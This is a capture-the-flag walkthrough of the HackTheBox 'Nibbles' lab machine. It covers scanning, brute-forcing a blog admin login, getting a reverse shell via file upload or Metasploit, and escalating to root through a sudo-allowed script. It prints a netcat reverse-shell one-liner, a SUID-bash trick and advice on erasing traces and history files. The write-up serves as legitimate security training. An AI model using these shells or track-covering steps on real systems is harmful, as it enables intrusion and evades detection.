## Hackthebox 		Nibbles (10.129.3.40)


### Enumeration

I'll start off with an nmap scan and we notice only ports 22 ssh, and 80 web are open.


	22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
	| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
	|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
	| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
	|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
	|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
	80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
	|_http-server-header: Apache/2.4.18 (Ubuntu)
	|_http-title: Site doesn't have a title (text/html).
	| http-methods: 
	|_  Supported Methods: GET HEAD POST OPTIONS
	Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
	OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
	Aggressive OS guesses: Linux 3.16 (96%), Linux 3.18 (96%), Linux 3.2 - 4.9 (96%), Linux 4.2 (96%), Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.8 - 3.11 (95%), Linux 4.8 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 4.4 (95%)
	No exact OS matches for host (test conditions non-ideal).
	TCP/IP fingerprint:
	SCAN(V=7.94SVN%E=4%D=10/3%OT=22%CT=%CU=38158%PV=Y%DS=2%DC=T%G=N%TM=66FEE817%P=aarch64-unknown-linux-gnu)
	SEQ(SP=FC%GCD=1%ISR=109%TI=Z%CI=I%TS=3)
	SEQ(SP=FC%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)
	OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)
	WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
	ECN(R=Y%DF=Y%T=40%W=7210%O=M53CNNSNW7%CC=Y%Q=)
	T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
	T2(R=N)
	T3(R=N)
	T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
	T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
	T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
	T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
	U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
	IE(R=Y%DFI=N%T=40%CD=S)

	Uptime guess: 0.699 days (since Wed Oct  2 21:07:09 2024)
	Network Distance: 2 hops
	TCP Sequence Prediction: Difficulty=252 (Good luck!)
	IP ID Sequence Generation: All zeros
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

	TRACEROUTE (using port 80/tcp)
	HOP RTT      ADDRESS
	1   61.98 ms 10.10.14.1
	2   62.02 ms 10.129.3.40

	Read data files from: /usr/share/nmap
	OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

### Further enum - next I'll run an nmap vuln scan against port 80 followed by an nmap script http scan.

nmap --script= vuln -T4 -oN nmap-vuln-scan.nmap 10.129.3.40

nmap --script- http-* -T4 -oN nmap-http-scan.nmap 10.129.3.40

![website](/Nibbles/images/nibbles.png) 

The website just says 'hello world' I looks to be an apache server v 2.4

My nmap vuln scan didn't return any useful results however, when I was waiting it to finish I viewed the source code of the web page and found there is a /nibbleblog/ directory. And it is a working directory.

![website](/Nibbles/images/source.png) 

I also found a readme page that shows us it's running nibbleblog v 4.0.3

![website](/Nibbles/images/readme.png) 

These were all the directories that returned a 200 response after running a gobutser scan.

![website](/Nibbles/images/dir-enum.png) 

Under the /content/private directory I found a users.xml file that had a username of admin.

![website](/Nibbles/images/user.png) 

Since I know there is an admin user and I can't find a password I decided to run cewl against the site to generate an uppercase and lowercase wordlist.

![website](/Nibbles/images/cewl.png) 

![website](/Nibbles/images/cewl2.png) 

Next, I'll caputer one of the post requests with burp and send it to intrude and set the payload value to password and run my wordlists and see if I get any hits. Just load the word list and make sure payload is set on the password variable and hit Start attack.


![website](/Nibbles/images/burp.png) 

![website](/Nibbles/images/burp2.png) 

Oops it looks like a triggered a security mechanism to prevent brute force attacks against the website however, I did get a 200 response from the password Nibbles before I got blacklisted LOL. I might have to wait a while or just reset the box but now I have a working username and password. This is one thing to watch out for when brute forcing websites and services.

![website](/Nibbles/images/200.png) 

![website](/Nibbles/images/admin.png) 

After waiting a bit I was able to login to the admin page.

![website](/Nibbles/images/login.png) 

Using searchsploit I find that there's also a metasploit file upload vulnerability and it's for the version we have 4.0.

![website](/Nibbles/images/foothold.png) 

### Foothold

I did finally get the metasploit module working and I'll show that really quick. But you can also upload a php reverse shell through the plugins --> My image --> upload. and then just go to /content/private/images/<shell name>. But heres the metaslpoit way.

With these options set we should get a shell.

![website](/Nibbles/images/metasploit.png) 


Well need to set the following options for the module. And we can try and run it and see if we get a shell.

![website](/Nibbles/images/shell.png) 


### Privilege Escalation

We do get a shell as the user nibbler. We can now grab the user.txt flag and running sudo -l shows

	User nibbler may run the following commands on Nibbles:
	    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh


there is no personal directory but there is a personal.zip file if we unzip it it creates the /personal/stuff/monitor.sh path and shell.

if we just echo this to monitor.sh is should give us a root shell.

	#!/bin/bash
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.240 1234 >/tmp/f


![foothold](/Nibbles/images/pre-root.png) 

Now I'll set a netcat lister on port 1234 on my attack box and run sudo /home/nibbler/personal/stuff/monitor.sh and it should give us a root shell.

And we do get a root shell and can now grab the root.txt flag.

![foothold](/Nibbles/images/root.png) 

Now if you're going for your OSCP and don't want to burn your metasploit useage or have already used it there is another way to get a shell with out Metasploit.

We can use our credentials of admin:nibbles to login to the admin page. Go to plugins --> my image --> unload a php reserse shell on the host. It will throw a lot of errors but it does work. If you are on kali a good one is at /usr/share/webshells/php/.

Once the php file is uploaded if we go to /nibbleblog/content/private/plugins/my_image we should find our reverse shell and make sure you have a listener set up and click on the image file to spawn the shell.

![foothold](/Nibbles/images/plugin.png) 

![foothold](/Nibbles/images/alt.png) 

We can also try something else for priv esc. Instead of writing a reverse shell to monitor.sh which might flag us flags by network EDR's we can try a script like the following:

	$!/bin/bash

	/bin/chmod u+s /bin/bash && /bin/cp /bin/bash /tmp/bash

In theory after we execute monitor.sh it should set the u & s bits on bash and them copy it to tmp. From there we can either cd to the tmp directory or just /tmp/bash -p to get root privileges on the host.

![foothold](/Nibbles/images/chmod.png) 

It definitely copied /bin/bash to the temp directory but that isn't all we wanted. I modified our script a litle bit. Let's see if it will work now.

![foothold](/Nibbles/images/modify.png) 

Still no luck, However, checking the permissions of /bin/bash it did get the s system varible added to it so we should just be able to execute /bin/bash -p and still get a root shell. It didn't copy it to /tmp with the permissions set like we wanted but still just executing /bin/bash -p does give us root on the box. 

![foothold](/Nibbles/images/root2.png) 

Don't forget to cleanup all the scripts and bash binaries we left in /tmp before leaving. Don't wanna leave too many footprints lazying around ;) 

I copied the personal.zip file to my attack machine before I started messing around with it on the target, also that way I could replace it later. I deleted the /personal /stuff directories it made under the nubbler user and all the binaries in /tmp. Back to personal.zip in nibbler directory. We're on our way to coverying all our tracks. Don't forget about those history files either. Welp that's all for now.

![foothold](/Nibbles/images/cleanup.png) 
